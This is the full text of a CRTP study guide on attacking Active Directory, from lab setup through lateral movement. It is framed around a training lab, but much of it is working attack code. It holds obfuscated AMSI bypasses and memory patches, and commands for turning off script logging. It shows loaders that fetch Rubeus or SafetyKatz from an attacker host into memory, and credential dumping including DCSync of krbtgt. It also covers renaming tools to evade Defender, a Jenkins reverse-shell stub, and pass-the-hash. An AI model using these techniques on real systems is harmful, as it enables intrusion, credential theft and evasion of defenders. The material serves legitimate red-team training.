# CRTP

CRTP — Certified Red Team Professional
Altered Security | Attacking & Defending Active Directory

By DarcHacker.

LinkedIn:[www.linkedin.com/in/mostafa-ibrahim-60b543341](http://www.linkedin.com/in/mostafa-ibrahim-60b543341)

---

---

## Table of Contents

| # | Module | Key Topics |
| --- | --- | --- |
| 00 | [Lab Setup & Methodology](about:blank#00-lab-setup--methodology) | Invisi-Shell, AMSI, OpSec |
| 01 | [AD Enumeration — PowerView](about:blank#01-ad-enumeration--powerview) | Users, groups, GPO, ACL, trusts |
| 02 | [AD Enumeration — AD Module](about:blank#02-ad-enumeration--ad-module) | Native cmdlets, no extra tools |
| 03 | [AD Enumeration — BloodHound](about:blank#03-ad-enumeration--bloodhound) | SharpHound, attack paths |
| 04 | [Offensive PowerShell Tradecraft](about:blank#04-offensive-powershell-tradecraft) | AMSI bypass, CLM, logging bypass |
| 05 | [Offensive .NET Tradecraft](about:blank#05-offensive-net-tradecraft) | Loaders, in-memory execution, MDE |
| 06 | [Local Privilege Escalation](about:blank#06-local-privilege-escalation) | PowerUp, services, registry, apps |
| 07 | [Lateral Movement](about:blank#07-lateral-movement) | PSRemoting, WMI, WinRM, PsExec |
| 08 | [Domain Privilege Escalation — Kerberoasting](about:blank#08-domain-privilege-escalation--kerberoasting) | SPNs, TGS, hashcat |
| 09 | [Domain Privilege Escalation — AS-REP Roasting](about:blank#09-domain-privilege-escalation--as-rep-roasting) | No preauth, hash crack |
| 10 | [Domain Privilege Escalation — Unconstrained Delegation](about:blank#10-domain-privilege-escalation--unconstrained-delegation) | TGT extraction, PrintSpooler |
| 11 | [Domain Privilege Escalation — Constrained Delegation](about:blank#11-domain-privilege-escalation--constrained-delegation) | S4U2Self, S4U2Proxy, Rubeus |
| 12 | [Domain Privilege Escalation — RBCD](about:blank#12-domain-privilege-escalation--resource-based-constrained-delegation) | Computer object abuse |
| 13 | [Domain Privilege Escalation — ACL Abuse](about:blank#13-domain-privilege-escalation--acl-abuse) | GenericAll, WriteDACL, ForceChangePassword |
| 14 | [Domain Privilege Escalation — DNS Admins](about:blank#14-domain-privilege-escalation--dns-admins) | DLL injection via DNS |
| 15 | [Credential Theft & Mimikatz](about:blank#15-credential-theft--mimikatz) | LSASS, SAM, logon passwords |
| 16 | [Domain Persistence — Golden Ticket](about:blank#16-domain-persistence--golden-ticket) | krbtgt abuse |
| 17 | [Domain Persistence — Silver Ticket](about:blank#17-domain-persistence--silver-ticket) | Service TGS forgery |
| 18 | [Domain Persistence — Diamond Ticket](about:blank#18-domain-persistence--diamond-ticket) | Modify existing TGT |
| 19 | [Domain Persistence — Skeleton Key](about:blank#19-domain-persistence--skeleton-key) | Universal password backdoor |
| 20 | [Domain Persistence — DSRM](about:blank#20-domain-persistence--dsrm) | DC local admin abuse |
| 21 | [Domain Persistence — Custom SSP](about:blank#21-domain-persistence--custom-ssp) | Track logons, credential capture |
| 22 | [Domain Persistence — ACL Backdoors](about:blank#22-domain-persistence--acl-backdoors) | AdminSDHolder, DCSync rights |
| 23 | [Domain Persistence — Security Descriptors](about:blank#23-domain-persistence--security-descriptors) | WMI, PSRemoting, RemoteReg |
| 24 | [Cross-Domain Attacks — Child to Forest Root](about:blank#24-cross-domain-attacks--child-to-forest-root) | Trust tickets, krbtgt hash |
| 25 | [Cross-Forest Trust Attacks](about:blank#25-cross-forest-trust-attacks) | SID history, inter-forest TGT |
| 26 | [MSSQL Server Attacks](about:blank#26-mssql-server-attacks) | PowerUpSQL, linked servers, xp_cmdshell |
| 27 | [Defenses & Detection Bypasses](about:blank#27-defenses--detection-bypasses) | MDI, Defender, logging |
| 28 | [Sliver C2 Framework](about:blank#28-sliver-c2-framework) | Beacons, pivoting, operations |
| 29 | [CRTP Exam Strategy & Checklists](about:blank#29-crtp-exam-strategy--checklists) | 24-hour roadmap, scoring |
| 30 | [Essential Resources & Links](about:blank#30-essential-resources--links) | Tools, websites, references |

---

## 00 Lab Setup & Methodology

### The CRTP Assumed Breach Model

```
╔═══════════════════════════════════════════════════════════════╗
║  You START as a low-privilege domain user                     ║
║  on a domain-joined machine.                                  ║
║                                                               ║
║  The goal: escalate privileges, move laterally,               ║
║  and compromise the entire forest.                            ║
║                                                               ║
║  Rule: NO unpatched CVE exploits.                             ║
║        Abuse FEATURES and MISCONFIGURATIONS only.             ║
╚═══════════════════════════════════════════════════════════════╝

Lab Environment:
  student.dollarcorp.moneycorp.local   ← your foothold
        │
        ├── dollarcorp.moneycorp.local   (child domain)
        │         └── Domain Controller: dcorp-dc
        │
        ├── moneycorp.local             (forest root)
        │         └── Domain Controller: mcorp-dc
        │
        └── eurocorp.local              (external trust)
                  └── Domain Controller: eu-dc
```

### Initial Access — Lab Connection

```bash
# Option 1: Web browser via Guacamole (no VPN needed)
# Access: https://enterprisesecurity.io

# Option 2: OpenVPN
sudo openvpn studentXX.ovpn
# Then RDP to student machine:
xfreerdp /v:<STUDENT_IP> /u:student1 /p:password /dynamic-resolution /drive:tools,/opt/crtp-tools
```

### Invisi-Shell (Bypass PS Logging)

```powershell
# Invisi-Shell hooks .NET assemblies to bypass:
# - Script Block Logging
# - Module Logging
# - Transcription
# - Anti-Malware Scan Interface (AMSI) via hook

# Run as normal user:
C:\AD\Tools\InvisiShell\RunWithRegistryNonAdmin.bat

# Run as admin:
C:\AD\Tools\InvisiShell\RunWithPathedAdmin.bat

# What it does:
# Creates a COM server that intercepts PowerShell's scripting engine
# so all PS activity goes unlogged. Run ALL tools from an Invisi-Shell session.

# Screenshot reference: After running the .bat, notice the PS prompt
# no longer has the ">" sign changed - but logging is now disabled.
```

### Methodology — Attack Path

```
STEP 1: Bypass Defenses (AMSI, logging)
STEP 2: Enumerate everything (users, groups, ACLs, trusts, GPOs, SPNs)
STEP 3: Map attack paths (BloodHound)
STEP 4: Identify low-hanging fruit (Kerberoastable, delegation, ACL misconfigs)
STEP 5: Local privilege escalation (if needed)
STEP 6: Lateral movement (reach other machines)
STEP 7: Domain privilege escalation (become DA)
STEP 8: Persist in domain (Golden Ticket, ACL backdoors)
STEP 9: Cross domain / forest escalation (Enterprise Admin)
STEP 10: Document everything — submit report
```

---

## 01 AD Enumeration — PowerView

> PowerView is the primary enumeration tool in CRTP.
Load it inside an Invisi-Shell session to bypass AMSI.
> 

### Loading PowerView

```powershell
# Load PowerView (inside Invisi-Shell session)
. C:\AD\Tools\PowerView.ps1

# If AMSI blocks it, bypass first (see Module 04), then load:
. C:\AD\Tools\PowerView.ps1

# PowerView source: https://github.com/PowerShellMafia/PowerSploit
```

### Domain Enumeration

```powershell
# ── Domain Info ──────────────────────────────────────────────────────────
Get-Domain
Get-Domain -Domain moneycorp.local          # Enumerate another domain

Get-DomainController
Get-DomainController -Domain moneycorp.local

Get-DomainPolicy
(Get-DomainPolicy)."system access"          # Password policy
(Get-DomainPolicy)."kerberos policy"        # Kerberos ticket settings

# Domain SID (needed for Golden/Silver tickets)
Get-DomainSID
```

### User Enumeration

```powershell
# ── All Users ────────────────────────────────────────────────────────────
Get-DomainUser
Get-DomainUser -Identity student1
Get-DomainUser | select -ExpandProperty samaccountname

# Key user properties to check:
Get-DomainUser | select samaccountname, description, memberof, pwdlastset, lastlogon

# Users with no password expiry (interesting for persistence):
Get-DomainUser -UACFilter DONT_EXPIRE_PASSWORD | select samaccountname

# Users with passwords never changed:
Get-DomainUser | where {$_.pwdlastset -eq 0} | select samaccountname

# Users with description containing "pass" (admins often leave creds here!):
Get-DomainUser | where {$_.description -like "*pass*"} | select samaccountname,description

# Actively logged on users (needs admin on target):
Get-LoggedOnLocal -ComputerName dcorp-adminsrv

# Recently logged on users:
Get-LastLoggedOn -ComputerName dcorp-adminsrv

# Find where a specific user is logged in:
Find-DomainUserLocation -UserIdentity "Domain Admins"
Find-DomainUserLocation -UserIdentity "svcadmin"
```

### Computer Enumeration

```powershell
Get-DomainComputer | select name, operatingsystem, dnshostname
Get-DomainComputer | select -ExpandProperty dnshostname

# Computers with specific OS
Get-DomainComputer -OperatingSystem "*Server 2022*"

# Test connectivity
Get-DomainComputer | Test-Connection -Count 1 -ErrorAction SilentlyContinue

# Ping sweep against all domain computers
Get-DomainComputer | select dnshostname | ForEach-Object {
  Test-Connection -ComputerName $_.dnshostname -Count 1 -Quiet 2>$null
}
```

### Group Enumeration

```powershell
# All groups
Get-DomainGroup | select name, description

# Members of Domain Admins
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins" -Recurse   # Nested groups

# All groups a user is member of
Get-DomainGroup -UserName student1 | select name

# Members of Enterprise Admins (forest root)
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local

# Local group membership (admin rights on machines)
Get-NetLocalGroupMember -ComputerName dcorp-adminsrv -GroupName Administrators
```

### Local Admin Hunting

```powershell
# Find all machines where current user has local admin
Find-LocalAdminAccess
Find-LocalAdminAccess -Verbose

# Find machines where Domain Admins are logged in
Find-DomainUserLocation

# Where can we PSRemote?
$computers = Get-DomainComputer | select -ExpandProperty dnshostname
foreach($c in $computers) {
    $result = Invoke-Command -ComputerName $c -ScriptBlock {whoami} -ErrorAction SilentlyContinue
    if($result) { Write-Host "[+] PSRemote:$c —$result" }
}

# Invoke-UserHunter (find DA sessions)
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
Invoke-UserHunter -Stealth    # Less noisy, queries fewer machines
```

### GPO Enumeration

```powershell
# All Group Policy Objects
Get-DomainGPO | select displayname, gpcfilesyspath
Get-DomainGPO -ComputerIdentity dcorp-adminsrv | select displayname   # GPOs applied to machine
Get-DomainGPO -UserIdentity student1 | select displayname             # GPOs applied to user

# GPO-based restricted groups (gives local admin)
Get-DomainGPOLocalGroup
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GroupMembers

# Computers where a user has local admin via GPO
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators -Identity student1
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcorp-adminsrv
```

### Organizational Unit (OU) Enumeration

```powershell
Get-DomainOU
Get-DomainOU | select name
Get-DomainOU -Identity StudentMachines | select -ExpandProperty distinguishedname

# What GPO is applied to an OU?
(Get-DomainOU -Identity StudentMachines).gplink
```

### Share Enumeration

```powershell
# Find shares (can be noisy)
Find-DomainShare
Find-DomainShare -CheckShareAccess    # Only return accessible ones

# Find interesting files on shares
Find-InterestingDomainShareFile -Include *.txt, *.ps1, *.bat, *.xml, *.conf, *.config
Find-InterestingDomainShareFile -SharePath "\\dcorp-dc\sysvol"
```

### ACL Enumeration (Critical for CRTP)

```powershell
# Get all ACLs for a user (what rights does the user have on which objects?)
Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# Find INTERESTING/abusable ACLs in the entire domain
# This is the MOST IMPORTANT enumeration in CRTP:
Find-InterestingDomainAcl -ResolveGUIDs

# Filter for specific rights:
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "GenericAll"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "WriteDACL"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "WriteOwner"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "GenericWrite"}

# Rights to look for (in order of importance):
# GenericAll       → Full control over the object
# GenericWrite     → Write to object attributes
# WriteDACL        → Modify the object's ACL (can grant yourself GenericAll)
# WriteOwner       → Change ownership (then modify ACL)
# ForceChangePassword → Change user's password without knowing current
# AllExtendedRights   → Includes DCSync, reset passwords
# Self             → Write to specific attributes

# Check ACLs of domain object (DCSync rights):
Get-DomainObjectAcl -Identity "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{
    ($_.ObjectAceType -match "Replication-Get") -and ($_.ActiveDirectoryRights -match "ExtendedRight")
}
```

### Trust Enumeration

```powershell
# Domain trusts
Get-DomainTrust
Get-DomainTrust -Domain moneycorp.local

# Forest trusts
Get-ForestTrust
Get-ForestDomain -Verbose
Get-ForestDomain | Get-DomainTrust

# Map all trusts (visual)
Get-ForestDomain | Get-DomainTrust | select SourceName,TargetName,TrustDirection,TrustType

# Trust directions:
# Bidirectional   = both domains trust each other
# Inbound         = THIS domain is trusted by target
# Outbound        = THIS domain trusts target
# Transitive      = trust extends through domain hierarchy

# External trusts (to eurocorp.local)
Get-DomainTrust -Domain eurocorp.local

# SID Filtering status (important for cross-forest attacks)
Get-DomainTrust | select SourceName,TargetName,TrustAttributes
# FILTER_SIDS = SID filtering enabled (blocks SID history injection)
# If NOT set = SID history attacks work across trust
```

---

## 02 AD Enumeration — AD Module

> Built-in AD module — already signed by Microsoft, less likely to trigger alerts.
No need to bypass AMSI for these cmdlets.
> 

### Loading the AD Module

```powershell
# The AD module needs to be imported (it IS available on domain-joined Windows):
Import-Module ActiveDirectory

# Alternatively, load without installation:
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

### Core Enumeration Commands

```powershell
# ── Domain ────────────────────────────────────────────────────────────────
Get-ADDomain
Get-ADDomain -Identity moneycorp.local
Get-ADForest
Get-ADForest -Identity moneycorp.local
Get-ADTrust -Filter *
Get-ADTrust -Server moneycorp.local -Filter *

# ── Users ─────────────────────────────────────────────────────────────────
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity student1 -Properties *
Get-ADUser -Filter * | select SamAccountName, Description, MemberOf

# Users with Kerberos preauth disabled (AS-REP roastable):
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth

# Users with SPN set (Kerberoastable):
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# ── Computers ─────────────────────────────────────────────────────────────
Get-ADComputer -Filter * | select Name,OperatingSystem,DNSHostName
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}

# Computers with unconstrained delegation:
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}

# Computers with constrained delegation:
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# ── Groups ────────────────────────────────────────────────────────────────
Get-ADGroup -Filter * | select Name, GroupScope, GroupCategory
Get-ADGroupMember -Identity "Domain Admins" -Recursive | select Name
Get-ADGroupMember -Identity "Enterprise Admins" | select Name

# ── Password Policy ───────────────────────────────────────────────────────
Get-ADDefaultDomainPasswordPolicy
(Get-ADDomain).MinPasswordLength
```

---

## 03 AD Enumeration — BloodHound

> BloodHound is the most powerful tool for visualizing attack paths in Active Directory.
CRTP requires SharpHound for collection and BloodHound GUI for analysis.
> 

### SharpHound Data Collection

```powershell
# Run SharpHound on victim machine (from Invisi-Shell session):
. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1

# Full collection (most data):
Invoke-BloodHound -CollectionMethod All -Verbose

# Stealth collection (less noisy):
Invoke-BloodHound -CollectionMethod All -ExcludeDC

# Specific collections:
Invoke-BloodHound -CollectionMethod DCOnly               # DC queries only
Invoke-BloodHound -CollectionMethod Group                # Group memberships
Invoke-BloodHound -CollectionMethod LocalAdmin           # Local admin rights
Invoke-BloodHound -CollectionMethod Session              # Active sessions
Invoke-BloodHound -CollectionMethod Trusts               # Domain trusts

# Output: creates a .zip file in current directory
# Transfer to Kali and import into BloodHound GUI

# SharpHound.exe (binary, better for evasion):
.\SharpHound.exe -c All --zipfilename bh_data.zip
.\SharpHound.exe -c All --stealth --zipfilename bh_data.zip
```

### BloodHound Setup on Kali

```bash
# Start Neo4j database
sudo neo4j start
# Access: http://localhost:7474
# Default: neo4j / neo4j — CHANGE PASSWORD on first login

# Start BloodHound
bloodhound &
# Login with Neo4j credentials

# Import data: drag .zip file into BloodHound window
```

### Critical BloodHound Queries for CRTP

```
╔═══════════════════════════════════════════════════════╗
║  PRE-BUILT QUERIES (click "Analysis" tab):           ║
╠═══════════════════════════════════════════════════════╣
║  Find Shortest Paths to Domain Admins                ║
║  Find All Domain Admins                              ║
║  Find Principals with DCSync Rights                  ║
║  List All Kerberoastable Accounts                    ║
║  Find AS-REP Roastable Users                         ║
║  Shortest Paths from Owned Principals                ║
║  Computers where Domain Users are Local Admins       ║
║  Find Computers with Unconstrained Delegation        ║
╚═══════════════════════════════════════════════════════╝
```

```
-- Custom Cypher queries in BloodHound search box:

-- Find all paths from student1 to Domain Admins
MATCH p=shortestPath((u:User {name:"STUDENT1@DOLLARCORP.MONEYCORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOLLARCORP.MONEYCORP.LOCAL"})) RETURN p

-- Find computers with unconstrained delegation (not DCs)
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name ENDS WITH "DC" RETURN c

-- Find users with Kerberoastable accounts
MATCH (u:User {hasspn:true}) RETURN u.name

-- Find AS-REP Roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

-- Find all ACL paths to DA
MATCH p=(u:User)-[r:GenericAll|GenericWrite|WriteDACL|WriteOwner|ForceChangePassword|AllExtendedRights]->(d:Domain) RETURN p

-- What can student1 do?
MATCH p=(u:User {name:"STUDENT1@DOLLARCORP.MONEYCORP.LOCAL"})-[r]->(n) RETURN p
```

### Marking Owned Principals

```
1. Right-click any node in BloodHound
2. Select "Mark User as Owned" or "Mark Computer as Owned"
3. Run "Shortest Paths from Owned Principals" query
4. BloodHound shows ALL paths from owned objects to Domain Admins
```

---

## 04 Offensive PowerShell Tradecraft

### AMSI Bypass

> AMSI (Anti-Malware Scan Interface) intercepts all PowerShell input and passes it to Windows Defender.
These bypasses patch AMSI in memory so scripts are not scanned.
> 

```powershell
# ── BYPASS 1: Reflection (most common in CRTP labs) ──────────────────────
# Obfuscated to avoid AMSI detecting the bypass itself:
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) (
[TYpE]( "{1}{0}"-F'F','rE' ) );
(
Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL
)."A`ss`Embly"."GET`TY`Pe"((
"{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')
)
)."g`etf`iElD"(
("{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')),
("{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,')
)."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

# ── BYPASS 2: Simple patch (works in many environments) ──────────────────
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ── BYPASS 3: Downgrade to PS v2 (disables many security features) ────────
powershell -version 2 -exec bypass -c "..."
# Note: PS v2 doesn't support AMSI, Script Block Logging, or Module Logging

# ── BYPASS 4: Memory patch via P/Invoke ───────────────────────────────────
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static')
$c=$b.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteInt32([IntPtr]$c,0x41414141)

# ── BYPASS 5: Forcing an error in amsiInitFailed ─────────────────────────
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBMN=$False
[Int32[]]$KYFL=@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
$URDNXQAS=[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldeCode('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$FLKRMX=[ZQCUW]::GetProcAddress($URDNXQAS,"$([systeM.neT.webUtility]::HtMldEcOde('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($FLKRMX, [uint32]6, 0x40, [ref]$p)
$NNDNDJ=[System.Runtime.InteropServices.Marshal]::Copy($KYFL, 0, $FLKRMX, 6)
```

### Bypassing Script Block Logging

```powershell
# Use Invisi-Shell (recommended — see Module 00)

# Manual: disable via registry (needs admin)
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Downgrade to PS v2 (no script block logging)
powershell.exe -version 2

# Check current logging status
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

### Bypassing Constrained Language Mode (CLM)

```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode
# FullLanguage = unrestricted
# ConstrainedLanguage = restricted (can't use .NET, reflection, etc.)

# CLM is usually enforced via AppLocker or WDAC

# Bypass methods:
# 1. Use tools that run in their own runspace
# 2. Use PSExec or WMI to spawn new process
# 3. Load a custom PS host
# 4. Use Win32 API via C# assembly (runs in CLR, not CLM)

# Check if AppLocker is configured:
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# If CLM is enforced, still usable:
# - cmd.exe built-ins
# - .NET CLR methods that don't need FullLanguage
# - Rubeus (standalone .NET binary — not affected by CLM)
# - SharpHound (standalone binary)
```

### Bypassing Execution Policy

```powershell
# Execution policy is NOT a security boundary — trivially bypassed:

powershell -ExecutionPolicy Bypass -File script.ps1
powershell -exec bypass -c "IEX(Get-Content script.ps1 | Out-String)"
Set-ExecutionPolicy Bypass -Scope Process
Get-Content script.ps1 | powershell -noprofile -

# Read file with bypass:
Invoke-Expression (Get-Content script.ps1 -Raw)
```

---

## 05 Offensive .NET Tradecraft

### Why .NET Tools?

```
PowerShell scripts → detected by AMSI, Script Block Logging
.NET assemblies   → run in CLR, bypass many PS-level detections
                    harder to detect, work in CLM environments
                    can be loaded in-memory (never touch disk)
```

### In-Memory .NET Loading

```powershell
# Load .NET assembly from URL directly into memory (never touches disk):
$bytes = (New-Object Net.WebClient).DownloadData('http://<LHOST>/Rubeus.exe')
$assembly = [System.Reflection.Assembly]::Load($bytes)
[Rubeus.Program]::Main("kerberoast /outfile:kerb.hash".Split())

# Generic loader for any .NET tool:
$data = (New-Object System.Net.WebClient).DownloadData('http://<LHOST>/tool.exe')
$assem = [System.Reflection.Assembly]::Load($data)
$assem.EntryPoint.Invoke($null, @([string[]]@("arg1","arg2")))
```

### SafetyKatz (Mimikatz .NET Port)

```powershell
# SafetyKatz = Mimikatz compiled as .NET assembly — evades Defender better
# Load from memory:
$bytes = (New-Object Net.WebClient).DownloadData('http://<LHOST>/SafetyKatz.exe')
[System.Reflection.Assembly]::Load($bytes)

# Or run directly:
.\SafetyKatz.exe "sekurlsa::logonpasswords" "exit"
.\SafetyKatz.exe "sekurlsa::ekeys" "exit"
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

# Using AES256 for overpass-the-hash (more OpSec friendly):
.\SafetyKatz.exe "sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /aes256:<AES256_HASH> /run:cmd.exe" "exit"
```

### Modifying Tools to Bypass Defender

```
Key principle: Defender uses YARA signatures on specific strings.
Change these strings in source code or binary, and the tool won't be detected.

Common bypasses:
1. Rename functions  : amsiInitFailed → amsiBlocked
2. Change strings    : "Mimikatz" → "M1m1k4tz"
3. String encryption : Encrypt constants, decrypt at runtime
4. Obfuscate         : Use tools like Invoke-Obfuscation
5. Compile yourself  : Recompile with modified class/method names
6. Fork & modify     : Fork the GitHub repo, change identifiable strings

CRTP provides pre-modified versions of tools in C:\AD\Tools\
Always use those — they are already bypassed for the lab environment.
```

---

## 06 Local Privilege Escalation

> CRTP is an assumed breach scenario — but sometimes you need to escalate
on your local machine before moving to other hosts.
> 

### PowerUp — Automated Privesc Discovery

```powershell
# Load PowerUp
. C:\AD\Tools\PowerUp.ps1

# Run all checks:
Invoke-AllChecks

# PowerUp checks for:
# - Unquoted service paths
# - Modifiable service binaries
# - Modifiable service registry keys
# - Writable program directories
# - AlwaysInstallElevated
# - Token privileges
# - Autologon credentials in registry
```

### Service Misconfigurations

```powershell
# ── Unquoted Service Path ────────────────────────────────────────────────
Get-ServiceUnquoted -Verbose
# Creates: Write-ServiceBinary -Name '<SVC>' -Path 'C:\Program Files\Vuln.exe'

# ── Modifiable Service Binary ─────────────────────────────────────────────
Get-ModifiableServiceFile -Verbose
Write-ServiceBinary -Name 'AbyssWebServer' -UserName 'dcorp\student1'

# ── Modifiable Service Config ─────────────────────────────────────────────
Get-ModifiableService -Verbose
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student1'

# ── AlwaysInstallElevated ─────────────────────────────────────────────────
# Check if enabled:
Get-RegistryAlwaysInstallElevated
# Exploit:
Write-UserAddMSI    # Creates an MSI that adds a user
msiexec /quiet /qn /i UserAdd.msi
```

### Enterprise Application Abuse (Jenkins)

```
In CRTP labs, Jenkins is commonly deployed without authentication
or with weak credentials. This is the most common initial escalation path.

Attack path:
1. Enumerate HTTP services on domain machines
2. Find Jenkins running on high port (e.g., 8080)
3. Access Jenkins console
4. Execute commands via Jenkins Script Console (Groovy):
```

```groovy
// Jenkins Script Console — Execute OS commands:
def cmd = "whoami"
def proc = cmd.execute()
proc.waitFor()
println proc.text

// Reverse shell via Jenkins:
def process = ['cmd.exe', '/c', 'powershell -enc <BASE64_PAYLOAD>'].execute()
process.waitFor()
```

```powershell
# After getting local admin via Jenkins:
# Dump local credentials, check for reused passwords in the domain

# Using Invoke-Mimikatz or SafetyKatz:
.\SafetyKatz.exe "sekurlsa::logonpasswords" "exit"

# This often reveals a svcadmin or domain admin credential!
```

---

## 07 Lateral Movement

### PowerShell Remoting (Most Used in CRTP)

```powershell
# ── One-to-one interactive session ────────────────────────────────────────
Enter-PSSession -ComputerName dcorp-adminsrv
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local

# With credentials:
$cred = Get-Credential
Enter-PSSession -ComputerName dcorp-adminsrv -Credential $cred

# ── Execute command on remote machine ──────────────────────────────────────
Invoke-Command -ComputerName dcorp-adminsrv -ScriptBlock {whoami; hostname; ipconfig}
Invoke-Command -ComputerName dcorp-adminsrv -Credential $cred -ScriptBlock {whoami}

# Run script remotely (load file into remote session):
Invoke-Command -ComputerName dcorp-adminsrv -FilePath C:\AD\Tools\PowerView.ps1
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName dcorp-adminsrv

# ── PSSession (persistent, more versatile) ────────────────────────────────
$sess = New-PSSession -ComputerName dcorp-adminsrv
$sess = New-PSSession -ComputerName dcorp-adminsrv -Credential $cred

# Execute in session:
Invoke-Command -Session $sess -ScriptBlock {whoami}
Enter-PSSession -Session $sess

# Load script into remote session:
Invoke-Command -Session $sess -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1
Invoke-Command -Session $sess -ScriptBlock {Invoke-Mimikatz}

# ── AMSI bypass BEFORE loading tools into remote session ──────────────────
Invoke-Command -Session $sess -ScriptBlock {
    S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) (
    [TYpE]( "{1}{0}"-F'F','rE' ) );
    ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"((
    "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')
    ))."g`etf`iElD"(
    ("{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')),
    ("{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,')
    )."sE`T`VaLUE"($null,$true)
}

# ── Pivot: create PSSession through a hop ─────────────────────────────────
# Access machine2 via machine1 as a hop:
$hop = New-PSSession -ComputerName dcorp-adminsrv
Invoke-Command -Session $hop -ScriptBlock {
    $s2 = New-PSSession -ComputerName dcorp-mgmt
    Invoke-Command -Session $s2 -ScriptBlock { whoami }
}
```

### WMI Lateral Movement

```powershell
# Execute command via WMI
Invoke-WmiMethod -Class Win32_Process -Name Create `
  -ArgumentList "powershell.exe -enc <B64>" `
  -ComputerName dcorp-adminsrv

# With credentials:
$cred = New-Object System.Management.Automation.PSCredential("dcorp\svcadmin", (ConvertTo-SecureString "password" -AsPlainText -Force))
Invoke-WmiMethod -Class Win32_Process -Name Create `
  -ArgumentList "cmd.exe /c whoami > C:\output.txt" `
  -ComputerName dcorp-adminsrv -Credential $cred

# wmic (classic):
wmic /node:dcorp-adminsrv /user:dcorp\svcadmin /password:pass process call create "cmd.exe /c whoami > C:\out.txt"
```

### Pass-the-Hash (Lateral Movement)

```powershell
# Overpass-the-Hash with SafetyKatz (spawn process with hash):
.\SafetyKatz.exe "sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /aes256:<AES256> /run:cmd.exe" "exit"

# Spawn PowerShell with DA hash:
.\SafetyKatz.exe "sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<NTLM> /run:powershell.exe" "exit"
# In new window: Enter-PSSession -ComputerName dcorp-dc

